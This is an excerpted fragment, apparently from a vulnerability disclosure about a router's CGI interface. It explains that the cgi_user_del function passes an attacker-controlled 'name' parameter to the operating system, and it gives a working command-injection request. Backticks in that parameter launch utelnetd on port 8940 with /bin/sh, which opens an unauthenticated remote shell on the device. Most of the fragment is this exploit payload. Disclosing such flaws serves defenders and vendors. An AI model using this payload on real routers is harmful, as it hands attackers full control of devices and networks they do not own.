...
In `cgi_user_del` function, `name` is directly passed by the attacker, so we can control the `name` to attack the OS.
...
We set `name` as **`utelnetd -p 8940 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=cgi_user_del&name=`utelnetd -p 8940 -l /bin/sh`
```
